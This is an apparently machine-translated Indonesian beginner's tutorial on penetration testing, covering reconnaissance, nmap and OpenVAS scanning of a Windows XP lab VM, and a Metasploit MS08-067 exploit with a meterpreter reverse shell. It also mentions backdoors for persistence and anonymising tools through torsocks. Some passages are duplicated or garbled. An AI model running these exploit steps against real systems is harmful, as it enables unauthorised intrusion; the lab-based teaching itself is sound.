---
layout: post
title: Cicipan Menjadi Hacker
categories: pentest
tags: [hacker, pentest, pengumpulan informasi, pemindaian, eksploitasi, pemeliharaan akses, metasploit, nmap, theharvester, openvas, ping, nslookup, Google, white hat, grey hat, black hat]
featuredimage: https://images.hive.blog/DQmRFvAwcLBsP6nABx74oYVGng8XcETg3JJquASvJsXmd6Q/Figure%201.1%20The%204%20basic%20steps%20of%20pentest.jpg
description: Ada empat langkah utama dalam pengujian penetrasi (1) Pengumpulan Informasi, (2) Pemindaian, (3) Eksploitasi, (4) Mempertahankan Akses.
canonicalurl: https://0fajarpurnama0.github.io/pentest/2020/04/01/cicipan-menjadi-hacker
---

## Daftar Isi

*   [0\. Garis Besar](#outline)
*   [1\. Apakah Anda seorang hacker, pentester, atau keduanya?](#hackerpentestereither)
    *   [1.1 Putih, Abu-abu, Topi Hitam, Yang Mana Anda?](#whitegreyblack)
    *   [1.2 Hal yang Mungkin Terjadi pada Pentester](#pentestermightmiss)
    *   [1.3 Beberapa Alat yang Mungkin Anda Dengar](#toolsheard)
    *   [1.4 Sebelum Melanjutkan](#beforeproceeding)
*   [2\. Pengumpulan Informasi](#informationgathering)
    *   [2.1 Persiapan](#preparation)
    *   [2.2 Cara Konvensional](#conventionalway)
    *   [2.3 Menggunakan Alat](#usingtools)
*   [3\. Memindai](#scanning)
    *   [3.1 Pemindaian Port](#portscanning)
    *   [3.2 Pemindaian Kerentanan](#vulnerabilityscanning)
*   [4\. Eksploitasi dan Menjaga Akses](#exploitationmantainingaccess)
    *   [4.1 Eksploitasi](#exploitation)
    *   [4.2 Menjaga Akses](#maintainingaccess)

## 0\. Garis Besar

Dunia seorang hacker sejati adalah sangat kompleks tetapi pada saat yang sama sangat menarik. Materi tentang hackeran sangat besar, bagi kami pengetahuan tangan pertama tentang jaringan dan pemrograman cukup diperlukan. Ini adalah hal yang belum pernah Anda ketahui tentang sistem jika Anda ingin retas berhasil. Sayangnya kami tidak akan bertindak sejauh topik yang disebutkan dalam bagian ini kami hanya membiarkan Anda memiliki rasa sebagai seorang hacker. Tidak diharapkan Anda akan menjadi hacker setelah Anda menyelesaikan topik ini, tetapi kami ingin memberi Anda sensasi hacker. Ini akan menjadi titik awal yang bagus jika Anda ingin menjadi seorang hacker.

Ada lebih banyak langkah dari sekadar membajak suatu sistem, tujuan pembelajarannya adalah untuk mengetahui apa itu langkah-langkah lain. Kami akan mempelajari beberapa alat yang digunakan dalam hackeran, dan akhirnya membiarkan Anda merasakan eksploitasi dan menciptakan malware. Pada dasarnya kami akan:

1.  Ketahui 4 langkah hackeran yang umum.
2.  Ketahui beberapa alat terkenal dalam hackeran.
3.  Lakukan eksperimen di lab virtual.

Ada beberapa demonstrasi dalam kursus ini, dan untuk ini sangat berhati-hati karena hackeran atau pengujian penetrasi tanpa izin melanggar hukum, bahkan pemindaian port dianggap sebagai pelanggaran (hati-hati terhadap pengumpulan informasi lainnya juga). Sepanjang jalan dijelaskan bagaimana Anda dapat melakukan percobaan. Di sini kita menggunakan OS khusus untuk pengujian penetrasi misalnya Backtrack, Kali Linux, ArchAssault, dan BackBox (terserah Anda apa yang harus digunakan, Anda hanya perlu alat yang tepat). Kami melakukan pengujian pada PC atau mesin virtual milik kami. Kami menyarankan agar Anda belajar sedikit tentang jaringan komputer, mempelajari pemrograman juga membantu.

## 1\. Apakah Anda seorang hacker, pentester, atau salah satunya?

### 1.1 Putih, Abu-abu, Topi Hitam, Yang Mana Anda?

Jika Anda melakukan pengujian penetrasi maka Anda adalah topi putih, tetapi jika Anda melakukan hackeran maka Anda adalah topi hitam, dan jika Anda tidak melakukannya, seperti salah satu penulis yang hanya ingin tahu. Penulis itu hanya ingin melihat apakah ia dapat membobol sistem, dan setelah berhasil biarkan saja apa adanya. Anda hanya melakukannya untuk bersenang-senang dapat dikategorikan sebagai topi abu-abu. Jika Anda melangkah lebih jauh seperti dengan tujuan menghancurkan sistem, mencuri informasi, dan skema jahat lainnya, Anda dikategorikan sebagai topi hitam. Topi putih di sisi lain berkelahi dengan topi hitam, mereka melakukan pengujian penetrasi (hack) untuk menemukan masalah keamanan pada sistem dan memperbaikinya. Mereka adalah orang-orang baik yang memiliki izin untuk menguji keamanan suatu sistem.

Jika Anda sangat baru dalam hal ini, kami sarankan Anda untuk mencoba menggunakan Linux atau sistem serupa sedikit dan membiasakan diri dengan beberapa baris perintah. Game hackeran seperti Hacker Evolution adalah awal yang sangat bagus dengan tidak hanya membiasakan diri dengan baris perintah Unix tetapi juga memberi Anda banyak gambar sebagai seorang hacker. Mempelajari sedikit tentang pemrograman komputer dan jaringan cukup membantu. Anda dapat mengambil langsung topik pemrograman dan jaringan komputer kursus ini.

### 1.2 Hal yang Mungkin Terjadi pada Pentester

Pada kursus ini kami menghindari menjadi hacker dan beralih ke pengujian penetrasi. Untuk tujuan pendidikan, kami ingin menjadikan ini sebagai legal mungkin. Baik sebagai hacker atau pentester ada langkah-langkah yang perlu dipertimbangkan selain eksploitasi. Jika Anda menonton banyak film aksi, proses eksploitasi adalah bagian paling keren dan berlaku untuk kenyataan juga, tetapi terlewatkan dalam menunjukkan variabel yang mempengaruhi probabilitas eksploitasi yang berhasil. Tanpa mempertimbangkan mereka, hal yang sama membabi buta masuk ke pintu depan. Di sini kita membahas 4 fase secara berurutan seperti di bawah ini dan pada Gambar 1.1\.

1.  Pengumpulan Informasi (beberapa panggilan pengintaian)
2.  Memindai
3.  Eksploitasi
4.  Menjaga Akses

![https://404store.com/2020/03/26/Figure1.1The4basicstepsofpentest.jpg](https://404store.com/2020/03/26/Figure1.1The4basicstepsofpentest.jpg)

Gambar 1.1 Fase umum pentest.



Ada fase ke-5 yang menutupi jejak Anda, tidak meninggalkan jejak, atau menghancurkan bukti, tapi itu mempertimbangkan topik yang sangat maju. Pengumpulan informasi seperti mengetahui di mana target, berapa banyak domain atau lokasi yang dimilikinya. Pemindaian melihat sistem apa yang digunakan target, pintu apa yang terbuka, dan bagaimana pintu masuk dijaga. Eksploitasi adalah proses yang melanggar, sementara mempertahankan akses adalah sebuah terowongan yang kami buat untuk memasukkan kembali target yang dieksploitasi tanpa mengulangi keseluruhan proses.

Ada fase ke-5 yang menutupi jejak Anda, tidak meninggalkan jejak, atau menghancurkan bukti, tapi itu mempertimbangkan topik yang sangat maju. Pengumpulan informasi seperti mengetahui di mana target, berapa banyak domain atau lokasi yang dimilikinya. Pemindaian melihat sistem apa yang digunakan target, pintu apa yang terbuka, dan bagaimana pintu masuk dijaga. Eksploitasi adalah proses yang melanggar, sementara mempertahankan akses adalah sebuah terowongan yang kami buat untuk memasukkan kembali target yang dieksploitasi tanpa mengulangi keseluruhan proses.

### 1.3 Beberapa Alat yang Mungkin Anda Dengar

Kami lebih suka menggunakan Sistem Operasi yang sudah dilengkapi dengan alat yang kami butuhkan seperti Kali Linux, Parrot OS, Backtrack, ArchAssault, Anonymous-OS, BackBox, Node Zero.

![https://404store.com/2020/03/26/Figure1.2KaliLinuxDesktop.png](https://404store.com/2020/03/26/Figure1.2KaliLinuxDesktop.png)

Gambar 1.2 Kali Linux Desktop.



Terserah Anda, tetapi Anda setidaknya harus menemukan alat atau yang setara. Kami akan menggunakan:

1.  Pengumpulan Informasi: Browser, NMAP, Whois, Dig, Nslookup, HTTrack, The Harvester, Netcraft, Host, MetaGooFil
2.  Memindai: Ping, PingSweep, NMAP, Nessus, Nikto, WebSecurify
3.  Eksploitasi: Kerangka Metasploit, Medussa, John The Ripper, Macof, ARP Spoof, Fast-Track Auto-PWN, Hydra
4.  Menjaga Akses: Netcat, Cryptcat, Netbus, Rootkits, Hacker Defender
5.  Lainnya: Mesin Virtual (VMWARE, VBOX, dll), Windows XP atau Lebih Rendah

### 1.4 Sebelum Melanjutkan

Cukup melakukan pengujian penetrasi tanpa izin mungkin dianggap sebagai hackeran, dan hackeran dianggap sebagai kejahatan. Kami tidak akan menghentikan Anda, tetapi lakukan dengan risiko Anda sendiri. Sebagai gantinya, kami menyarankan yang berikut jika Anda ingin berlatih:

*   Prasyarat adalah senjata Anda seperti OS, alat untuk pengumpulan informasi, pemindaian, eksploitasi, dll.
*   Pengumpulan informasi yang kami anggap baik-baik saja untuk dilakukan di Internet, tetapi lebih dari itu sebagian besar ilegal. Sebaliknya, kita dapat membangun target kita sendiri dengan OS tertentu, server web, jarak jauh, tergantung pada apa yang Anda butuhkan. Jika Anda kekurangan perangkat keras, Anda dapat menggunakan mesin virtual (VM), atau simulator baru tersedia.
*   Jika Anda memutuskan untuk membangun dan bereksperimen di lab Anda sendiri, sangat disarankan untuk mengisolasi jaringan (pastikan itu tidak dapat diakses dari Internet).
*   Jangan lupa untuk tidak menggunakan perangkat lunak bajakan, (bisikan: misalnya jika Anda tidak memiliki Windows XP legal sebagai target latihan, instal di VM, boot dan konfigurasikan tetapi jangan pernah gunakan, hanya untuk melakukan pengujian penetrasi. Akhirnya simpan untuk diri sendiri, jika perlu berikan lapisan keamanan agar tidak ada orang lain selain Anda yang tahu keberadaannya dan dapat mengaksesnya).
*   Agar aman, selalu coba lakukan secara anonim. Misalnya bahkan untuk pengumpulan informasi menggunakan whois, ping, dan nslookup, gunakan untuk jaringan (kami menggunakan torsocks), atau perangkat lunak lain yang menyediakan anonimitas.

## 2\. Pengumpulan Informasi

### 2.1 Persiapan

Karena ada banyak faktor yang perlu dipertimbangkan seperti sistem operasi yang bisa kita gunakan, alat, target, target latihan di VM, anonimitas, dll. Halaman ini akan diperbarui nanti.

### 2.2 Cara Konvensional

Informasi yang Anda butuhkan mungkin jenis perusahaan, perusahaan, institusi, atau organisasi yang menjadi target Anda, atau hanya grup, mungkin hanya pribadi. Bagaimanapun Anda mungkin memerlukan informasi seperti info kontak mereka, struktur organisasi, atau hanya produk mereka. Informasi semacam ini dapat diambil dengan cara konvensional:

*   Surat Kabar
*   Radio
*   TV
*   Majalah
*   Buku
*   Tampilkan
*   Percakapan
*   Iklan

### 2.3 Menggunakan Alat

Jika Anda membutuhkan situs, domain, alamat IP, alamat email, lebih baik menggunakan alat. Pertama-tama kita perlu menemukan situs web mereka, menjelajahi Internet menggunakan browser web dan menggunakan mesin pencari seperti Google, Yahoo, MSN.

#### 2.3.1 Yang Paling Tidak Diketahui dalam Menggunakan Google

Nyalakan komputer Anda >>> sambungkan ke Internet >>> nyalakan peramban web Anda >>> ketik www.google.com, begitulah semua orang menggunakannya, tetapi apakah Anda tahu ada lebih dari itu? Lihat Gambar 2.1\.

*   _site: istilah domain_ untuk mencari contoh: _site: gerbang tagihan microsoft.com_ (akan mengembalikan informasi tentang gerbang tagihan dari microsoft.com.
*   _allintitle: term_ contoh: _allintitle: index_ dari akan mengembalikan halaman web apa pun yang berisi indeks kata kunci.
*   _inurl: term_ contoh: _inurl: admin_ akan mengembalikan url apa pun yang memiliki kata admin.
*   _cache: mangareader.net_ akan menarik mangareader.net dari Google cache (saya tidak dapat mengakses melalui cara normal).
*   _filetype: log_ akan menemukan tipe file log, _filetype: pdf_ akan mengarsipkan tipe file pdf.

![https://file.army/i/BY0fsdQ](https://404store.com/2020/03/29/Figure2.1TryingGoogleTheDifferentWay.gif)

Gambar 2.1 Mencoba Google Dengan Cara Yang Berbeda.



#### 2.3.2 Ping

Mulai saat ini, kami mencoba menggunakan torsocks pada setiap perintah sehingga akan masuk ke jaringan dan membuat kami lebih anonim. Biasanya hanya melakukan perintah tanpa perintah torsocks jika Anda tidak perlu anonim .. Ping adalah program di baris perintah untuk memeriksa host hidup, latensi (waktu untuk paket untuk mencapai dan kembali), TTL, dan parameter lainnya tergantung versi program dan OS yang digunakan. Gambar 2.2 adalah contoh dari perintah ping.

![https://file.army/i/BYwEMzZ](https://404store.com/2020/04/01/Figure2.2Pingmetasploit.cominLinuxterminal.png)

Gambar 2.2 Ping metasploit.com di terminal Linux.



#### 2.3.3 Siapa, Dig, Host, Nslookup

Dig, Host, dan nslookup dapat digunakan untuk mengambil alamat IP suatu situs web, beberapa versi dapat melakukan sebaliknya. Gambar 2.3 adalah output dari dig, host, dan nslookup di metasploit.com, di bawah ini adalah output whois dengan banyak informasi.

![https://file.army/i/BYwEhD3](https://404store.com/2020/04/01/Figure2.3Dighostandnslookuponmetasploit.com.png)

Gambar 2.3 Gali, host, dan nslookup di metasploit.com.



`

<pre>#####################################################################################

root@kali:/home/fajarpurnama# torsocks whois metasploit.com

Whois Server Version 2.0

Domain names in the .com and .net domains can now be registered

with many different competing registrars. Go to http://www.internic.net

for detailed information.

   Domain Name: METASPLOIT.COM

   Registrar: MARKMONITOR INC.

   Sponsoring Registrar IANA ID: 292

   Whois Server: whois.markmonitor.com

   Referral URL: http://www.markmonitor.com

   Name Server: DELL.NS.CLOUDFLARE.COM

   Name Server: RICK.NS.CLOUDFLARE.COM

   Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited

   Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited

   Status: clientUpdateProhibited http://www.icann.org/epp#clientUpdateProhibited

   Updated Date: 25-nov-2015

   Creation Date: 10-jun-2003

   Expiration Date: 10-jun-2020

>>> Last update of whois database: Mon, 14 Dec 2015 14:06:20 GMT <<<

For more information on Whois status codes, please visit

https://www.icann.org/resources/pages/epp-status-codes-2014-06-16-en.

NOTICE: The expiration date displayed in this record is the date the

registrar's sponsorship of the domain name registration in the registry is

currently set to expire. This date does not necessarily reflect the expiration

date of the domain name registrant's agreement with the sponsoring

registrar.  Users may consult the sponsoring registrar's Whois database to

view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois

database through the use of electronic processes that are high-volume and

automated except as reasonably necessary to register domain names or

modify existing registrations; the Data in VeriSign Global Registry

Services' ("VeriSign") Whois database is provided by VeriSign for

information purposes only, and to assist persons in obtaining information

about or related to a domain name registration record. VeriSign does not

guarantee its accuracy. By submitting a Whois query, you agree to abide

by the following terms of use: You agree that you may use this Data only

for lawful purposes and that under no circumstances will you use this Data

to: (1) allow, enable, or otherwise support the transmission of mass

unsolicited, commercial advertising or solicitations via e-mail, telephone,

or facsimile; or (2) enable high volume, automated, electronic processes

that apply to VeriSign (or its computer systems). The compilation,

repackaging, dissemination or other use of this Data is expressly

prohibited without the prior written consent of VeriSign. You agree not to

use electronic processes that are automated and high-volume to access or

query the Whois database except as reasonably necessary to register

domain names or modify existing registrations. VeriSign reserves the right

to restrict your access to the Whois database in its sole discretion to ensure

operational stability.  VeriSign may restrict or terminate your access to the

Whois database for failure to abide by these terms of use. VeriSign

reserves the right to modify these terms at any time.

The Registry database contains ONLY .COM, .NET, .EDU domains and

Registrars.

Domain Name: metasploit.com

Registry Domain ID: 98973533_DOMAIN_COM-VRSN

Registrar WHOIS Server: whois.markmonitor.com

Registrar URL: http://www.markmonitor.com

Updated Date: 2015-11-24T21:21:32-0800

Creation Date: 2003-06-09T23:53:17-0700

Registrar Registration Expiration Date: 2020-06-09T23:53:17-0700

Registrar: MarkMonitor, Inc.

Registrar IANA ID: 292

Registrar Abuse Contact Email: abusecomplaints@markmonitor.com

Registrar Abuse Contact Phone: +1.2083895740

Domain Status: clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)

Domain Status: clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)

Domain Status: clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)

Registry Registrant ID: 

Registrant Name: Domain Admin

Registrant Organization: Rapid7

Registrant Street: 100 Summer Street, 13th Floor

Registrant City: Boston

Registrant State/Province: MA

Registrant Postal Code: 02110

Registrant Country: US

Registrant Phone: +1.6172471717

Registrant Phone Ext: 

Registrant Fax: +1.6175076488

Registrant Fax Ext: 

Registrant Email: domains@rapid7.com

Registry Admin ID: 

Admin Name: Domain Admin

Admin Organization: Rapid7

Admin Street: 100 Summer Street, 13th Floor

Admin City: Boston

Admin State/Province: MA

Admin Postal Code: 02110

Admin Country: US

Admin Phone: +1.6172471717

Admin Phone Ext: 

Admin Fax: +1.6175076488

Admin Fax Ext: 

Admin Email: domains@rapid7.com

Registry Tech ID: 

Tech Name: Domain Admin

Tech Organization: Rapid7

Tech Street: 100 Summer Street, 13th Floor

Tech City: Boston

Tech State/Province: MA

Tech Postal Code: 02110

Tech Country: US

Tech Phone: +1.6172471717

Tech Phone Ext: 

Tech Fax: +1.6175076488

Tech Fax Ext: 

Tech Email: domains@rapid7.com

Name Server: dell.ns.cloudflare.com

Name Server: rick.ns.cloudflare.com

DNSSEC: unsigned

URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/

>>> Last update of WHOIS database: 2015-12-14T06:06:39-0800 <<<

The Data in MarkMonitor.com's WHOIS database is provided by MarkMonitor.com for

information purposes, and to assist persons in obtaining information about or

related to a domain name registration record.  MarkMonitor.com does not guarantee

its accuracy.  By submitting a WHOIS query, you agree that you will use this Data

only for lawful purposes and that, under no circumstances will you use this Data to:

 (1) allow, enable, or otherwise support the transmission of mass unsolicited,

     commercial advertising or solicitations via e-mail (spam); or

 (2) enable high volume, automated, electronic processes that apply to

     MarkMonitor.com (or its systems).

MarkMonitor.com reserves the right to modify these terms at any time.

By submitting this query, you agree to abide by this policy.

MarkMonitor is the Global Leader in Online Brand Protection.

MarkMonitor Domain Management(TM)

MarkMonitor Brand Protection(TM)

MarkMonitor AntiPiracy(TM)

MarkMonitor AntiFraud(TM)

Professional and Managed Services

Visit MarkMonitor at http://www.markmonitor.com

Contact us at +1.8007459229

In Europe, at +44.02032062220

For more information on Whois status codes, please visit

 https://www.icann.org/resources/pages/epp-status-codes-2014-06-16-en

root@kali:/home/fajarpurnama# 

#####################################################################################
					</pre>

`

#### 2.3.4 The Harvester

Dengan menggunakan alat ini kita dapat menemukan host lain dari domain dan alamat email, di sini kita membatasi hingga 50 pencarian dan memilih untuk terhubung ke mesin pencari bing, mengubah bing ke semua untuk kinerja maksimal, dan lihat Gambar 2.4\.

![https://file.army/i/BYwEQhq](https://404store.com/2020/04/01/Figure2.4Usingtheharvesteronmetasploit.com.png)

Gambar 2.4 Menggunakan harvester di metasploit.com.



<div class="video-container"><iframe src="https://lbry.tv/$/embed/1-ping-dig-host-nslookup-whois/55c57eb0614910baece0c63ff9e8f8398d9a9d5c" allowfullscreen=""></iframe></div>

## 3\. Memindai

### 3.1 Pemindaian Port

Seperti dijelaskan di bagian pemindaian port, untuk melihat layanan apa yang berjalan pada host. Alat yang terkenal untuk ini adalah NMAP [https://nmap.org](https://nmap.org) . Pada percobaan ini kami ingin menggunakan Windows XP sebagai target kami, semakin tua OS semakin rentan, lebih mudah ditembus, dan praktik yang lebih baik untuk pemula. Jika Anda memerlukan subjek untuk berlatih, cobalah mencari OS rentan yang siap pakai di Internet [dengan risiko Anda sendiri, jika Anda membaca bagian menggunakan Google untuk pengumpulan informasi, Anda harus sadar bahwa Anda dapat menulis semua judul: indeks xp untuk mencari Gambar Windows XP, kami sarankan berlatih dengan TinyXP karena lebih aman].

Pokoknya kembali ke topik kita menginstal Windows XP di Virtual Box, terhubung menggunakan adaptor host saja (Anda dapat mengatur adaptor ini di file> preferensi), dan kami beralih dari firewall karena versi kami sudah ditambal. Kami kemudian menggunakan NMAP untuk memindai Windows XP pada alamat IP 192.168.56.101\.

*   nmap --help (lihat menu bantuan)
*   man nmap (lihat dokumentasi untuk nmap)
*   nmap -sS 192.168.56.101\.

![https://file.army/i/BYwEDpV](https://404store.com/2020/04/01/Figure3.1ScanningWithNMAP.png)

Gambar 3.1 Memindai dengan NMAP.



### Pemindaian 3.2 Kerentanan

Saat ini ada alat yang akan melakukan pemindaian kerentanan untuk kami saat biasanya kami menemukan kerentanan secara manual. Alat yang kami ketahui adalah Nessus dan Openvas, di OS kami Openvas diinstal sebagai default.

1.  apt-get install openvas (jika belum diinstal).
2.  openvas-setup (pengaturan pertama, jangan lewatkan kata sandi, nama pengguna: admin. Cari web untuk mengubah kata sandi jika Anda kehilangannya).
3.  openvas-start (untuk memulainya).
4.  Lalu buka browser web Anda dan buka url: https://127.0.0.1:9392\.
5.  Masuk, untuk pemula cukup gunakan pemindaian cepat dan masukkan alamat IP target, di sini adalah 192.168.56.101\.

![https://file.army/i/BYwE2II](https://404store.com/2020/04/01/Figure3.2VunerabilityScanningwithOpenvas.gif)

Gambar 3.2 Memindai Vunerability dengan Openvas.



## 4\. Eksploitasi dan Menjaga Akses

### 4.1 Eksploitasi

Lebih banyak materi segera hadir, tetapi untuk saat ini kami ingin melakukan eksploitasi yang merupakan salah satu yang paling sederhana namun sangat menarik bagi pemula. Ini awalnya tidak sederhana tetapi metasploit menyediakan alat untuk kita yang hanya perlu kita gunakan. Setelah kami melakukan pemindaian pada Windows XP pada bagian 3, kami sekarang bergerak untuk mengeksploitasi Port 445 yang mereka sebut netapii, kerentanan SMB.

1.  msfconsole (untuk mengaktifkannya)
2.  cari seseorang (untuk menemukan untuk dieksploitasi)
3.  gunakan exploit / windows / smb / ms08_067_netapi
4.  tampilkan opsi (untuk melihat opsi)
5.  atur rhost 192.168.56.101\.
6.  payload pencarian (untuk melihat payload digunakan)
7.  atur windows muatan meter / meterpreter / reverse_tcp
8.  tampilkan opsi
9.  atur lhost 192.168.56.1 (menyerang PC)
10.  exploit

### 4.2 Menjaga Akses

Ini dimungkinkan karena saya mematikan firewall, apa yang terjadi jika kami tiba-tiba menyalakannya atau target memperbaiki kerentanan (Bahkan revisi terbaru TinyXP dengan firewall tidak dimungkinkan untuk dieksploitasi)? Jadi kita harus memasukkan pintu belakang, trojan, virus, dll. Video akan menunjukkan semuanya, mulai dari pemindaian hingga proses ini.

<div class="video-container"><iframe src="https://lbry.tv/$/embed/exploit-windows-xpsp3-and-persistence/c7e8a62e336a71f2bf10987af2b23907bac0637e" allowfullscreen=""></iframe></div>

## Mirror

*   [https://www.publish0x.com/0fajarpurnama0/having-a-taste-of-being-a-hacker-xlmlvp?a=4oeEw0Yb0B&tid=github](https://www.publish0x.com/0fajarpurnama0/having-a-taste-of-being-a-hacker-xlmlvp?a=4oeEw0Yb0B&tid=github)
*   [https://0fajarpurnama0.github.io/pentest/2020/04/01/cicipan-menjadi-hacker](https://0fajarpurnama0.github.io/pentest/2020/04/01/cicipan-menjadi-hacker)
*   [https://medium.com/@0fajarpurnama0/having-a-taste-of-being-a-hacker-29d9f4f06077](https://medium.com/@0fajarpurnama0/having-a-taste-of-being-a-hacker-29d9f4f06077)
*   [https://hicc.cs.kumamoto-u.ac.jp/~fajar/internet/2020/04/01/having-taste-being-hacker.html](https://hicc.cs.kumamoto-u.ac.jp/~fajar/internet/2020/04/01/having-taste-being-hacker.html)
*   [https://0fajarpurnama0.tumblr.com/post/614101280240091136/having-a-taste-of-being-a-hacker](https://0fajarpurnama0.tumblr.com/post/614101280240091136/having-a-taste-of-being-a-hacker)
*   [https://0darkking0.blogspot.com/2020/04/having-taste-of-being-hacker.html](https://0darkking0.blogspot.com/2020/04/having-taste-of-being-hacker.html)
*   [https://hive.blog/pentest/@fajar.purnama/having-a-taste-of-being-a-hacker?r=fajar.purnama](https://hive.blog/pentest/@fajar.purnama/having-a-taste-of-being-a-hacker?r=fajar.purnama)
*   [https://0fajarpurnama0.cloudaccess.host/index.php/uncategorised/22-having-a-taste-of-being-a-hacker](https://0fajarpurnama0.cloudaccess.host/index.php/uncategorised/22-having-a-taste-of-being-a-hacker)
*   [https://steemit.com/pentest/@fajar.purnama/having-a-taste-of-being-a-hacker?r=fajar.purnama](https://steemit.com/pentest/@fajar.purnama/having-a-taste-of-being-a-hacker?r=fajar.purnama)
*   [http://0fajarpurnama0.weebly.com/blog/having-a-taste-of-being-a-hacker](http://0fajarpurnama0.weebly.com/blog/having-a-taste-of-being-a-hacker)
*   [https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/having-a-taste-of-being-a-hacker](https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/having-a-taste-of-being-a-hacker)
*   [http://www.teiii.cn/having-a-taste-of-being-a-hacker](http://www.teiii.cn/having-a-taste-of-being-a-hacker)